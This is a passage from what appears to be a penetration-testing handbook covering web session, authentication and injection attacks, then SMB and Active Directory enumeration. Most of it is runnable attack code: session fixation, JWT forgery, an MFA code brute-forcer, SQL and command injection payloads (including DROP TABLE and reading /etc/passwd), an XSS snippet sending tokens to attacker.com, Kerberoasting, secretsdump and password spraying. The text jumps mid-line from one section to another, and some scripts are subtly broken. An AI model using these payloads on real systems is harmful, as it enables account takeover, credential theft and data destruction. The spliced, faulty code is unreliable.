# If application context switches possible: lateral privilege escalation
```

[Inference] Concurrent session policies vary by applicationâ€”unrestricted concurrent sessions increase account takeover risk by enabling session theft without forcing legitimate

**Session Timeout Testing**

Identify idle and absolute timeout policies:

```bash
# 1. Idle timeout (timeout after inactivity)
# Establish session
SESSIONID=$(curl -s -c - https://target.com/login \
    -d "username=user&password=pass" | grep SESSIONID | awk '{print $NF}')

# Wait for idle timeout period
# Typical: 15-30 minutes for web apps, 8-12 hours for banking

for i in {1..180}; do
    echo "Waiting... minute $i"
    sleep 60
    
    # Test if session still valid
    curl -s -b "SESSIONID=$SESSIONID" https://target.com/dashboard | grep -q "logged in"
    if [ $? -ne 0 ]; then
        echo "Session expired after $i minutes"
        break
    fi
done

# 2. Absolute timeout (timeout regardless of activity)
# Long-term session test

# Establish session
DATE=$(date +%s)
SESSIONID=$(curl -s -c - https://target.com/login \
    -d "username=user&password=pass" | grep SESSIONID | awk '{print $NF}')

# Perform activity to prevent idle timeout
for day in {1..30}; do
    # Activity every 5 minutes (prevents idle timeout)
    for i in {1..288}; do  # 288 * 5 min = 1440 min = 24 hours
        sleep 300
        curl -s -b "SESSIONID=$SESSIONID" https://target.com/dashboard > /dev/null
    done
    
    # Check if session still valid
    if ! curl -s -b "SESSIONID=$SESSIONID" https://target.com/dashboard | grep -q "logged in"; then
        echo "Absolute timeout triggered after $day days"
        break
    fi
done

# 3. Timeout configuration analysis
# Check HTTP headers for timeout hints
curl -I https://target.com | grep -iE "cache-control|expires|set-cookie"

# Extract timeout from JavaScript
curl -s https://target.com/assets/app.js | grep -iE "timeout|session.*[0-9]+" | head -10
```

Timeout bypass techniques:

```bash
# 1. Activity-based timeout bypass
# Keep session alive through periodic requests
python3 << 'EOF'
import requests
import time

session = requests.Session()

# Authenticate
session.post('https://target.com/login', 
    data={'username': 'user', 'password': 'pass'})

# Maintain session indefinitely
while True:
    # Perform lightweight request to refresh activity
    session.get('https://target.com/api/ping')
    
    # Sleep less than idle timeout
    # If timeout is 30 minutes, request every 25 minutes
    time.sleep(1500)  # 25 minutes
EOF

# 2. Frame-based timeout reset
# Render hidden frames making requests periodically
cat > timeout_bypass.html << 'EOF'
<iframe style="display:none;" src="https://target.com/api/ping"></iframe>
<script>
    // Refresh iframe every 20 minutes (less than 30-min timeout)
    setInterval(function() {
        document.querySelector('iframe').src = 
            'https://target.com/api/ping?' + Date.now();
    }, 1200000);  // 20 minutes in milliseconds
</script>
EOF

# 3. Predictable session ID reuse
# If sessions not invalidated on logout, reconnect with old ID
curl -b "SESSIONID=old_session_id" https://target.com/dashboard
```

[Inference] Weak timeout policies enable prolonged account access from compromised sessions, while timeout bypass through continuous activity defeats protection mechanisms.

**Session Fixation Attack**

Test application for session fixation vulnerabilities:

```bash
# Session fixation requires:
# 1. Application accepts pre-set session ID from attacker
# 2. Session not regenerated on authentication
# 3. Attacker and victim use same session ID

# Attack procedure:

# 1. Attacker generates/specifies session ID
ATTACKER_SESSION="FIXATED_SESSION_ID"

# 2. Attacker tricks victim to authenticate with this ID
# Method 1: Direct link with session parameter
# https://target.com/login?SESSIONID=FIXATED_SESSION_ID

# Method 2: Set cookie via third-party domain
cat > set_cookie_attack.html << 'EOF'
<html>
<body>
    <img src="https://target.com/set_cookie?SESSIONID=FIXATED_SESSION_ID">
</body>
</html>
EOF

# 3. Test if victim's authentication uses attacker's session ID
# Simulate victim login
curl -v https://target.com/login \
    -b "SESSIONID=$ATTACKER_SESSION" \
    -d "username=victim&password=password" \
    2>&1 | grep -i "set-cookie"

# If same SESSIONID returned: session fixation vulnerability
# Attacker uses FIXATED_SESSION_ID to access victim's account

# 4. Verify exploitation
curl -b "SESSIONID=$ATTACKER_SESSION" https://target.com/dashboard
# Should show victim's account if vulnerable
```

Session fixation remediation verification:

```bash
# Secure implementation: Session ID changes on login
# Test:

# 1. Before login
curl -v https://target.com 2>&1 | grep -i "set-cookie"
# Pre-login session: SESSIONID=pre_auth_123

# 2. During login
curl -v https://target.com/login \
    -b "SESSIONID=pre_auth_123" \
    -d "username=user&password=pass" \
    2>&1 | grep -i "set-cookie"

# 3. After login
# Should show NEW session ID different from pre-auth

# If post-login SESSIONID differs from pre-login: SECURE
# If same: VULNERABLE to session fixation
```

[Inference] Session fixation attacks succeed when applications fail to regenerate session identifiers upon authentication, enabling attackers to maintain control through unified session IDs.

**Privilege Escalation via Session Manipulation**

Exploit session data handling for privilege escalation:

```bash
# 1. Direct privilege flag modification
# Session stores user role/privilege information

# Capture session cookie
curl -s -c cookies.txt https://target.com/login \
    -d "username=lowprivuser&password=pass" > /dev/null

# Extract session
SESSION=$(cat cookies.txt | grep SESSION | awk '{print $NF}')

# Analyze session if encoded/encrypted
python3 << 'EOF'
import base64
import json

session = "encoded_session_value"

# Attempt base64 decode
try:
    decoded = base64.b64decode(session)
    print(decoded)
    
    # If JSON format, parse
    try:
        data = json.loads(decoded)
        print(f"User: {data.get('user')}")
        print(f"Role: {data.get('role')}")
        
        # Modify privilege
        data['role'] = 'admin'
        
        # Re-encode
        modified = base64.b64encode(json.dumps(data).encode()).decode()
        print(f"Modified session: {modified}")
    except:
        pass
except:
    print("Not base64 encoded")
EOF

# 2. Cookie injection via XSS
# Inject JavaScript to modify session cookie
<script>
    document.cookie = "role=admin; path=/;";
    document.cookie = "is_admin=true; path=/;";
    
    // Force page reload to apply new cookies
    window.location.reload();
</script>

# 3. Session object manipulation via CORS/fetch
# If authentication data retrievable via API
fetch('https://target.com/api/session')
    .then(r => r.json())
    .then(data => {
        data.role = 'admin';
        
        // POST modified data back
        fetch('https://target.com/api/session', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });

# 4. Implicit privilege via parameter
# Some applications store privilege in URL/request
curl "https://target.com/dashboard?user_id=1&is_admin=1"

# Change to target user with admin flag
curl "https://target.com/dashboard?user_id=999&is_admin=1"
```

[Inference] Session privilege escalation exploits improper server-side validation where client-submitted data (roles, permissions) accepted without verification against authentication authority.

**Cross-Site Request Forgery (CSRF) Token Analysis**

Examine CSRF token implementation:

```bash
# 1. Token detection
curl -s https://target.com/form | grep -iE "csrf|token" | head -10

# 2. Token validity testing
# Capture form with CSRF token
TOKEN=$(curl -s https://target.com/form | grep -oE 'csrf.*value="[^"]*' | cut -d'"' -f2)

# Submit with valid token
curl -X POST https://target.com/action \
    -d "csrf_token=$TOKEN&action=delete&id=123"

# 3. Token reuse testing
# Use same token multiple times
for i in {1..10}; do
    curl -X POST https://target.com/action \
        -d "csrf_token=$TOKEN&action=delete&id=$i"
done

# If all succeed: token not invalidated after use (weak implementation)

# 4. Token validation weakness
# Submit without token
curl -X POST https://target.com/action -d "action=delete&id=123"

# Submit with empty token
curl -X POST https://target.com/action \
    -d "csrf_token=&action=delete&id=123"

# Submit with different token format
curl -X POST https://target.com/action \
    -d "csrf_token=invalid_value&action=delete&id=123"

# 5. Parameter name mismatch
# Server checks 'csrf_token' but form uses 'token'
# Test with expected parameter names
for param in "csrf_token" "token" "_token" "csrfToken" "authenticity_token"; do
    curl -X POST https://target.com/action \
        -d "${param}=test_value&action=delete&id=123"
done
```

CSRF token bypass techniques:

```bash
# 1. Double-submit cookie pattern weakness
# CSRF token matches cookie value (for stateless validation)
# Attacker can set cookie if subdomain accessible

# If vulnerable to subdomain cookie setting:
# Set CSRF token cookie via subdomain
curl -b "csrf_token=known_value" https://subdomain.target.com

# Then submit form with matching token
curl -X POST https://target.com/action \
    -b "csrf_token=known_value" \
    -d "csrf_token=known_value&action=delete&id=123"

# 2. Referrer header bypass
# CSRF protection relies on Referrer validation
# If Referrer validation weak/absent

# Submit from different origin
curl -H "Referer: https://attacker.com" \
    -X POST https://target.com/action \
    -d "csrf_token=$TOKEN&action=delete&id=123"

# 3. Method override bypass
# Server checks POST CSRF but accepts PUT/DELETE

curl -X PUT https://target.com/action \
    -d "action=delete&id=123"
    # Missing CSRF token

# 4. CORS CSRF (if CORS misconfigured)
# Attacker's domain allowed to make cross-origin requests
# JavaScript-based CSRF from attacker site

cat > csrf_cors.html << 'EOF'
<script>
    fetch('https://target.com/api/action', {
        method: 'POST',
        credentials: 'include',
        body: 'action=delete&id=123'
    });
</script>
EOF
```

[Inference] CSRF token protection depends on implementation detailsâ€”weak generation, reuse, or validation enable straightforward bypasses despite token presence.

---

## Authentication Mechanism Identification

Authentication mechanism identification reveals login methods, password policies, account lockout mechanisms, and multi-factor authentication (MFA) implementationsâ€”mapping attack surface for credential attacks and bypass attempts.

**Authentication Method Detection**

Identify login and authentication endpoints:

```bash
# 1. Form-based authentication
curl -s https://target.com | grep -iE "<form.*login|<input.*password"

# Extract form details
python3 << 'EOF'
from bs4 import BeautifulSoup
import requests

resp = requests.get('https://target.com/login')
soup = BeautifulSoup(resp.content, 'html.parser')

forms = soup.find_all('form')
for form in forms:
    print(f"Action: {form.get('action')}")
    print(f"Method: {form.get('method')}")
    print(f"Inputs:")
    for inp in form.find_all('input'):
        print(f"  - {inp.get('name')}: {inp.get('type')}")
EOF

# 2. API-based authentication (JSON endpoints)
curl -s https://target.com/api/login -X POST -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}' -w "\n%{http_code}\n"

# 3. HTTP Basic Authentication
curl -v https://target.com/admin 2>&1 | grep -i "www-authenticate"
# If present: WWW-Authenticate: Basic realm="..."

# 4. OAuth/Social login
curl -s https://target.com | grep -iE "github|google|facebook|oauth" | head -10

# 5. SAML authentication
curl -s https://target.com | grep -iE "saml|assertion" | head -10

# 6. Certificate-based authentication
curl -v --cert client_cert.pem https://target.com 2>&1 | grep -i "certificate"
```

[Inference] Authentication method identification reveals multiple potential attack vectorsâ€”form-based credentials, API token interception, certificate compromiseâ€”each requiring distinct exploitation techniques.

**Password Policy Extraction**

Identify password requirements and weaknesses:

```bash
# 1. Client-side password validation
curl -s https://target.com/register | grep -oE "pattern|minlength|maxlength|title" | head -20

# Extract JavaScript password rules
curl -s https://target.com/assets/auth.js | grep -iE "password.*regex|password.*check|password.*rule"

# 2. Password requirement analysis
python3 << 'EOF'
import re

js_content = open('auth.js').read()

# Search for password validation patterns
patterns = re.findall(r'/(.*?)/[gimsu]*', js_content)

for pattern in patterns[:10]:
    if any(char in pattern for char in ['^', '$', '[', ']', '(', ')']):
        print(f"Regex pattern found: /{pattern}/")
        # Analyze for weakness
        if '.*' in pattern:
            print("  - Allows any character (no special char requirement)")
        if '{' in pattern:
            length = re.search(r'{(\d+),?(\d+)?}', pattern)
            if length:
                print(f"  - Length requirement: {length.group(0)}")
EOF

# 3. Registration form policy enumeration
# Attempt registration with various passwords

passwords_to_test = [
    "pass",  # Too short
    "password",  # No special chars
    "12345678",  # No letters
    "abcdefgh",  # No numbers
    "P@ssw0rd",  # Meets typical requirements
]

for pwd in passwords_to_test:
    curl -X POST https://target.com/register \
        -d "username=test_user&password=$pwd" \
        -w "\n%{http_code}\n"
```

Common password policy weaknesses:

```
Minimum length < 8 characters: Weak
No special character requirement: Weaker
No uppercase/lowercase mixing: Weak
No number requirement: Weak
Password history < 3: Users recycle passwords
Password age unlimited: Allows stale passwords
No lockout after failed attempts: Enables brute-force
```

[Inference] Weak password policies combined with absence of rate limiting enable practical password brute-force attacks where common passwords crack quickly.

**Account Lockout and Rate Limiting**

Test account protection mechanisms:

```bash
# 1. Determine lockout threshold
username="test_user"

# Attempt multiple failed logins
for i in {1..20}; do
    response=$(curl -s -X POST https://target.com/login \
        -d "username=$username&password=wrongpass$i" \
        -w "%{http_code}")
    
    # Check for lockout indicators
    if echo "$response" | grep -qi "locked\|suspended\|attempts remaining"; then
        echo "Account locked after $i attempts"
        break
    fi
    
    # Extract attempts remaining if provided
    attempts=$(echo "$response" | grep -oE "attempts remaining: [0-9]+" | awk '{print $NF}')
    if [ -n "$attempts" ]; then
        echo "Attempt $i: $attempts attempts remaining"
    fi
done

# 2. Lockout duration measurement
# Attempt login after lockout
echo "Testing lockout duration..."

for i in {1..30}; do
    response=$(curl -s -X POST https://target.com/login \
        -d "username=$username&password=wrongpass" \
        -w "%{http_code}")
    
    if echo "$response" | grep -qi "unlocked\|success"; then
        echo "Account unlocked after $(($i * 60)) seconds"
        break
    fi
    
    sleep 60  # Wait 1 minute between attempts
done

# 3. Rate limiting on login endpoint
# Test for response time delays

python3 << 'EOF'
import requests
import time

url = "https://target.com/login"

for attempt in range(1, 11):
    start = time.time()
    
    response = requests.post(url, data={
        'username': 'test',
        'password': 'test'
    })
    
    elapsed = time.time() - start
    
    print(f"Attempt {attempt}: {elapsed:.2f} seconds")
    
    # If delay increases: rate limiting in effect
    # delay increases exponentially: exponential backoff
EOF

# 4. Account enumeration via rate limiting
# Different response times for valid vs. invalid users

python3 << 'EOF'
import requests
import statistics

def test_user(username, is_valid):
    times = []
    
    for i in range(5):
        start = time.time()
        requests.post('https://target.com/login',
            data={'username': username, 'password': 'incorrect'})
        times.append(time.time() - start)
    
    avg_time = statistics.mean(times)
    print(f"User '{username}' ({valid}: {avg_time:.3f}s")
    
    return avg_time

# Test with known valid vs. invalid users
valid_time = test_user('admin', True)
invalid_time = test_user('nonexistent_user_xyz', False)

if valid_time > invalid_time * 1.5:
    print("Account enumeration possible via timing")
EOF
```

[Inference] Weak rate limiting or absence of account lockout enables practical password brute-force attacks, while timing differences in responses reveal valid account names for targeted attacks.

**Multi-Factor Authentication (MFA) Detection and Bypass**

Identify and test MFA implementations:

```bash
# 1. MFA method detection
curl -s https://target.com/login | grep -iE "totp|otp|mfa|2fa|two.factor|authenticator|sms|email"

# 2. MFA enforcement testing
# Authenticate without providing MFA code

curl -X POST https://target.com/login \
    -d "username=user&password=correct_password" \
    -c cookies.txt

# Check if authenticated without MFA
curl -b cookies.txt https://target.com/dashboard \
    -w "%{http_code}"

# If 200: MFA not enforced
# If 302 redirect to MFA: MFA enforced

# 3. MFA code brute-force
# Typical MFA codes: 6-digit numbers (000000-999999)

python3 << 'EOF'
import requests
from itertools import product

session = requests.Session()

# First authenticate to get MFA prompt
session.post('https://target.com/login',
    data={'username': 'user', 'password': 'password'})

# Brute-force MFA code
for code in range(0, 1000000):
    otp = f"{code:06d}"
    
    response = session.post('https://target.com/mfa_verify',
        data={'otp': otp})
    
    if response.status_code == 200 and 'success' in response.text:
        print(f"MFA code found: {otp}")
        break
    
    if code % 10000 == 0:
        print(f"Tested: {otp}")
EOF

# 4. MFA bypass techniques

# Backup codes leakage
curl -s https://target.com/security | grep -oE "[0-9]{4}-[0-9]{4}-[0-9]{4}"

# Session fixation via MFA
# Force user to authenticate with attacker's session
# Then bypass MFA check

# MFA implementation flaws
# - Code sent via email/SMS: Intercept
# - Code stored in JavaScript: Extract from code
# - Sequential codes: Predict next code

# TOTP (Time-based OTP) recovery
# If backup codes available: obtain secret key
# Regenerate valid TOTP codes offline

# 5. Account recovery via MFA bypass
# Use "forgot password" if not MFA-protected
curl -X POST https://target.com/forgot_password \
    -d "email=user@example.com"

# May send reset link via email without MFA
# If email compromise possible: reset account
```

[Inference] MFA implementation weaknessesâ€”code brute-force, backup code exposure, sequential predictionâ€”enable MFA bypass achieving account access despite second-factor protection.

**Session Hijacking and Token Interception**

Exploit authentication tokens for account takeover:

```bash
# 1. Token interception via MITM (HTTP without HTTPS)
tcpdump -i eth0 -A "tcp port 80" | grep -i "authorization\|cookie\|token"

# 2. Token extraction from browser
# Via XSS vulnerability
<script>
    // Extract authentication tokens
    const token = localStorage.getItem('auth_token');
    const cookie = document.cookie;
    
    // Exfiltrate
    fetch('https://attacker.com/steal?token=' + encodeURIComponent(token));
</script>

# 3. Token reuse testing
# Capture authentication token
TOKEN=$(curl -s -c cookies.txt https://target.com/login \
    -d "username=user&password=pass" | grep -oE "token=[^;]*" | cut -d'=' -f2)

# Use token from different client/IP
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/profile

# If successful: token not bound to client IP/device

# 4. Token prediction/generation
# If tokens use predictable patterns

python3 << 'EOF'
import hashlib
import time

# Common weak token generation patterns
username = 'admin'

# Pattern 1: MD5(username)
token1 = hashlib.md5(username.encode()).hexdigest()

# Pattern 2: MD5(username + timestamp)
timestamp = int(time.time())
token2 = hashlib.md5((username + str(timestamp)).encode()).hexdigest()

# Pattern 3: Sequential numeric tokens
for token_num in range(1, 100000):
    token3 = str(token_num)
    
    # Test if token valid
    # requests.get(url, headers={'Authorization': token3})
EOF

# 5. JWT token manipulation (if using JWT)
python3 << 'EOF'
import jwt
import base64
import json

# Extract JWT from authorization header
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Decode (without verification)
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})

print(f"Algorithm: {header['alg']}")
print(f"Payload: {payload}")

# JWT vulnerabilities

# 1. Algorithm confusion (alg: none)
# Modify algorithm to "none"
modified_payload = {
    'sub': 'admin',
    'iat': int(time.time()),
    'alg': 'none'
}

# Create new token with no signature
new_token = jwt.encode(modified_payload, '', algorithm='none')

# 2. Weak secret key
# Brute-force JWT signature with dictionary
import jwt

wordlist = ['secret', 'password', 'admin123', '12345678']

for secret in wordlist:
    try:
        payload = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Secret found: {secret}")
        
        # Modify payload with known secret
        payload['role'] = 'admin'
        new_token = jwt.encode(payload, secret, algorithm='HS256')
        break
    except:
        pass
EOF
```

[Inference] Authentication token exploitation enables full account access when tokens captured, reused, or manipulated without additional verification mechanisms like device binding or geographic validation.

---

## Input Validation Testing Points

Input validation testing identifies missing or improper sanitization enabling injection attacks, command execution, and data exfiltration through application input processing flaws.

**Common Input Validation Testing Locations**

Identify all user input points requiring testing:

```bash
# 1. HTML forms
curl -s https://target.com | grep -oE "<input[^>]*>" | head -20

# Extract input parameters
python3 << 'EOF'
from bs4 import BeautifulSoup
import requests

resp = requests.get('https://target.com')
soup = BeautifulSoup(resp.content, 'html.parser')

inputs = soup.find_all('input')
for inp in inputs:
    print(f"Name: {inp.get('name')}, Type: {inp.get('type')}, Value: {inp.get('value')}")

textareas = soup.find_all('textarea')
for ta in textareas:
    print(f"Textarea: {ta.get('name')}")

selects = soup.find_all('select')
for sel in selects:
    print(f"Select: {sel.get('name')}")
EOF

# 2. URL parameters
curl -s "https://target.com/search?q=test&category=1&sort=name" -w "\n"

# Extract parameters
python3 << 'EOF'
from urllib.parse import urlparse, parse_qs

url = "https://target.com/search?q=test&category=1&sort=name"
parsed = urlparse(url)
params = parse_qs(parsed.query)

for param, values in params.items():
    print(f"{param}: {values}")
EOF

# 3. JSON API endpoints
curl -X POST https://target.com/api/search \
    -H "Content-Type: application/json" \
    -d '{"query":"test","limit":10}' -w "\n"

# 4. Cookie values
curl -s -c - https://target.com | grep -i cookie

# 5. HTTP headers (User-Agent, Referer, etc.)
curl -I -H "User-Agent: TestAgent" -H "X-Custom-Header: test" https://target.com
```

[Inference] Comprehensive input validation testing requires systematic testing of all input pointsâ€”forms, parameters, headersâ€”where user-supplied data enters application processing.

**SQL Injection Testing**

Test for SQL injection vulnerabilities:

```bash
# 1. Basic SQL injection detection
# Test with single quote to trigger SQL error

curl "https://target.com/search?q=test'"
# Error: "SQL syntax error" or database error message

# 2. Numeric parameter testing
curl "https://target.com/user?id=1' OR '1'='1"
curl "https://target.com/user?id=1 OR 1=1"
curl "https://target.com/user?id=1; DROP TABLE users--"

# 3. Boolean-based blind SQL injection
# Application behavior changes based on SQL truth

curl "https://target.com/login?username=admin' AND '1'='1"  # True condition
curl "https://target.com/login?username=admin' AND '1'='2"  # False condition

# If different responses: SQL injection likely

# 4. Time-based blind SQL injection
# Database delays indicate vulnerable queries

# MySQL SLEEP function
curl "https://target.com/search?q=test' AND SLEEP(5)--"

# PostgreSQL pg_sleep
curl "https://target.com/search?q=test' AND pg_sleep(5)--"

# Measure response time
python3 << 'EOF'
import requests
import time

# Normal query
start = time.time()
requests.get('https://target.com/search?q=test')
normal_time = time.time() - start

# SQL injection with delay
start = time.time()
requests.get('https://target.com/search?q=test\' AND SLEEP(5)--')
delayed_time = time.time() - start

if delayed_time > normal_time + 4:
    print("Time-based SQL injection confirmed")
EOF

# 5. Data extraction via UNION injection
# UNION allows combining query results

# Determine column count first
curl "https://target.com/search?q=test' ORDER BY 5--"  # Increase until error

# UNION SELECT with known columns
curl "https://target.com/search?q=test' UNION SELECT 1,2,3,4--"

# Extract database information
curl "https://target.com/search?q=test' UNION SELECT user(),database(),version(),4--"

# Extract table names
curl "https://target.com/search?q=test' UNION SELECT table_name,2,3,4 FROM information_schema.tables--"

# 6. Automated SQL injection testing
sqlmap -u "https://target.com/search?q=test" -p q --dbs

# Alternative parameters
sqlmap -u "https://target.com/user?id=1" -p id --dbs

# POST-based injection
sqlmap -u "https://target.com/login" --data "username=test&password=test" -p username --dbs

# Cookie-based injection
sqlmap -u "https://target.com/dashboard" --cookie "sessionid=test" -p sessionid --dbs
```

[Inference] SQL injection severity ranges from information disclosure to complete database compromise, with exploitation success depending on database backend and application error handling.

**Command Injection Testing**

Identify arbitrary command execution vulnerabilities:

```bash
# 1. Basic command injection
# Test with command separators

curl "https://target.com/ping?host=example.com; id"
curl "https://target.com/ping?host=example.com | whoami"
curl "https://target.com/ping?host=example.com && cat /etc/passwd"
curl "https://target.com/ping?host=example.com\`whoami\`"

# 2. Blind command injection
# No output displayed, but commands executed

curl "https://target.com/process?file=test; touch /tmp/pwned"

# Verify execution (if file access available)
# Check if /tmp/pwned created

# 3. Time-based command injection
curl "https://target.com/process?file=test; sleep 5"

# 4. Output redirection
curl "https://target.com/process?file=test; id > /tmp/output"

# 5. Environmental variable exploitation
curl "https://target.com/process?file=$(whoami)"
curl "https://target.com/process?file=$((1+1))"

# 6. Null byte injection (bypasses filters)
curl "https://target.com/process?file=test%00; whoami"

# 7. Polyglot commands (work across multiple shells)
# sh, bash, zsh compatible

curl "https://target.com/ping?host=example.com$(touch /tmp/pwned)$(touch /tmp/pwned2)"

# 8. Escape sequence bypasses
# Bypass input filters

# Spaces bypass
curl "https://target.com/ping
```

## SMB Enumeration

### Protocol Overview

SMB (Server Message Block) operates on TCP ports 139 (NetBIOS) and 445 (Direct SMB). Modern implementations use SMB2/SMB3 over port 445.

### Host Discovery and SMB Detection

**Nmap SMB Scripts**

```bash
nmap -p139,445 --script smb-protocols <target>
nmap -p445 --script smb-os-discovery <target>
nmap -p445 --script smb-security-mode <target>
nmap -p445 --script smb-enum-shares,smb-enum-users <target>
```

**CrackMapExec (CME)**

```bash
# Basic SMB enumeration
crackmapexec smb <target>
crackmapexec smb <target> -u '' -p ''  # Null session
crackmapexec smb <target> -u 'guest' -p ''  # Guest session

# Protocol negotiation check
crackmapexec smb <target> --gen-relay-list relay.txt
```

### Share Enumeration

**smbclient**

```bash
# List shares (null session)
smbclient -L //<target> -N

# List shares with credentials
smbclient -L //<target> -U <username>

# Connect to specific share
smbclient //<target>/<share> -U <username>

# Download all files recursively
smbclient //<target>/<share> -U <username> -c "prompt OFF;recurse ON;mget *"
```

**smbmap**

```bash
# Enumerate shares with null session
smbmap -H <target>

# With credentials
smbmap -H <target> -u <username> -p <password>

# Recursive listing
smbmap -H <target> -u <username> -p <password> -R

# Download specific file
smbmap -H <target> -u <username> -p <password> --download '<share>\<path>\<file>'

# Execute command (if permissions allow)
smbmap -H <target> -u <username> -p <password> -x 'whoami'
```

**enum4linux**

```bash
# Full enumeration
enum4linux -a <target>

# Specific enumerations
enum4linux -S <target>  # Share enumeration
enum4linux -U <target>  # User enumeration
enum4linux -G <target>  # Group enumeration
enum4linux -P <target>  # Password policy
```

**enum4linux-ng** (Improved Python version)

```bash
enum4linux-ng -A <target>
enum4linux-ng -As <target> -oY output.yaml
```

### RPC Enumeration

**rpcclient**

```bash
# Connect with null session
rpcclient -U '' -N <target>

# Connect with credentials
rpcclient -U <username> <target>

# Common enumeration commands (once connected):
srvinfo          # Server information
enumdomains      # Enumerate domains
querydominfo     # Domain information
enumdomusers     # List domain users
enumdomgroups    # List domain groups
queryuser <RID>  # User details by RID
querygroupmem <RID>  # Group membership
enumprivs        # Enumerate privileges
```

**Automated RPC Queries**

```bash
# User enumeration via RPC
for i in $(seq 500 1100); do rpcclient -N -U "" <target> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name"; done
```

### Null Session Testing

**Net Command (from Windows)**

```cmd
net use \\<target>\IPC$ "" /user:""
net view \\<target>
```

**Linux Null Session**

```bash
smbclient -L //<target> -N
rpcclient -U '' -N <target>
```

### SMB Version Detection

**Metasploit**

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run
```

**Manual Banner Grab**

```bash
nmap -p445 --script smb-protocols <target>
```

### SMB Signing Analysis

```bash
# Check if SMB signing is required
nmap --script smb-security-mode -p445 <target>
crackmapexec smb <target> --gen-relay-list unsigned.txt
```

### Vulnerability Scanning

**EternalBlue (MS17-010)**

```bash
nmap --script smb-vuln-ms17-010 -p445 <target>

# Metasploit scanner
use auxiliary/scanner/smb/smb_ms17_010
```

**Common SMB Vulnerabilities**

```bash
nmap --script smb-vuln* -p445 <target>
```

---

## Active Directory Enumeration

### Domain Information Gathering

**ldapsearch** (Anonymous LDAP queries)

```bash
# Base domain enumeration
ldapsearch -x -h <DC-IP> -s base namingcontexts

# Enumerate all objects
ldapsearch -x -h <DC-IP> -b "DC=domain,DC=local"

# With credentials
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w '<password>' -b "DC=domain,DC=local"

# Enumerate users
ldapsearch -x -h <DC-IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Enumerate groups
ldapsearch -x -h <DC-IP> -b "DC=domain,DC=local" "(objectClass=group)" cn member
```

**CrackMapExec AD Enumeration**

```bash
# Enumerate domain users
crackmapexec smb <DC-IP> -u <username> -p <password> --users

# Enumerate domain groups
crackmapexec smb <DC-IP> -u <username> -p <password> --groups

# Enumerate password policy
crackmapexec smb <DC-IP> -u <username> -p <password> --pass-pol

# Enumerate logged-on users
crackmapexec smb <target> -u <username> -p <password> --loggedon-users

# Enumerate local admin access
crackmapexec smb <targets> -u <username> -p <password> --local-auth
```

### BloodHound Data Collection

**SharpHound (Windows collector)**

```powershell
# From Windows with credentials
.\SharpHound.exe -c All -d domain.local --domaincontroller <DC-IP>

# Specific collection methods
.\SharpHound.exe -c Session,LoggedOn,Group,Trusts
```

**BloodHound.py** (Python collector from Linux)

```bash
# Full collection
bloodhound-python -u <username> -p <password> -ns <DC-IP> -d domain.local -c all

# Specific collections
bloodhound-python -u <username> -p <password> -ns <DC-IP> -d domain.local -c DCOnly
```

### Impacket Tools for AD Enumeration

**GetADUsers.py**

```bash
GetADUsers.py -all domain.local/username:password -dc-ip <DC-IP>
```

**GetUserSPNs.py** (Kerberoasting)

```bash
GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP> -request
```

**GetNPUsers.py** (AS-REP Roasting)

```bash
# Find users without pre-auth required
GetNPUsers.py domain.local/ -dc-ip <DC-IP> -usersfile users.txt -format hashcat
```

**secretsdump.py**

```bash
secretsdump.py domain.local/username:password@<DC-IP>
```

### LDAP Enumeration Tools

**ldapdomaindump**

```bash
ldapdomaindump -u 'domain.local\username' -p 'password' <DC-IP>
```

**windapsearch**

```bash
# Enumerate users
python3 windapsearch.py -d domain.local -u username -p password --dc-ip <DC-IP> -U

# Enumerate privileged users
python3 windapsearch.py -d domain.local -u username -p password --dc-ip <DC-IP> --privileged-users

# Enumerate computers
python3 windapsearch.py -d domain.local -u username -p password --dc-ip <DC-IP> -C
```

### Kerberos Enumeration

**kerbrute** (Username enumeration)

```bash
# User enumeration via Kerberos
kerbrute userenum -d domain.local --dc <DC-IP> userlist.txt

# Password spraying
kerbrute passwordspray -d domain.local --dc <DC-IP> users.txt 'Password123'
```

**GetNPUsers.py** (AS-REP Roasting without credentials)

```bash
GetNPUsers.py domain.local/ -dc-ip <DC-IP> -no-pass -usersfile users.txt
```

---

## Domain Controller Discovery

### Network-Based Discovery

**Nmap DC Detection**

```bash
# Standard DC ports
nmap -p88,389,445,464,636,3268,3269 <target-range>

# LDAP service detection
nmap -p389,636 --script ldap-rootdse <target>
```

**DNS Queries for DC Discovery**

```bash
# SRV record enumeration
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local <DNS-server>
nslookup -type=SRV _kerberos._tcp.dc._msdcs.domain.local <DNS-server>

# Using dig
dig @<DNS-server> _ldap._tcp.dc._msdcs.domain.local SRV
```

**CrackMapExec DC Discovery**

```bash
# Identify domain controllers
crackmapexec smb <target-range> --gen-relay-list dc-list.txt
```

### From Windows Host

**PowerShell DC Discovery**

```powershell
# Get domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# Get PDC emulator
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner

# NLTEST
nltest /dclist:domain.local
nltest /dsgetdc:domain.local
```

**CMD DC Discovery**

```cmd
# NetBIOS-based discovery
net group "Domain Controllers" /domain

# DNS-based discovery
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
```

### LDAP-Based DC Discovery

```bash
# Anonymous LDAP query for DCs
ldapsearch -x -h <DC-IP> -s base -b "" "(objectClass=*)" dnsHostName

# Authenticated query for all DCs
ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "OU=Domain Controllers,DC=domain,DC=local" "(objectClass=computer)" dNSHostName
```

### FSMO Role Discovery

**From Linux with rpcclient**

```bash
rpcclient -U username <DC-IP> -c "getdompwinfo"
```

**PowerShell FSMO Enumeration**

```powershell
netdom query fsmo
Get-ADForest | Select-Object SchemaMaster,DomainNamingMaster
Get-ADDomain | Select-Object PDCEmulator,RIDMaster,InfrastructureMaster
```

---

## User Enumeration

### RID Cycling

**enum4linux RID Cycling**

```bash
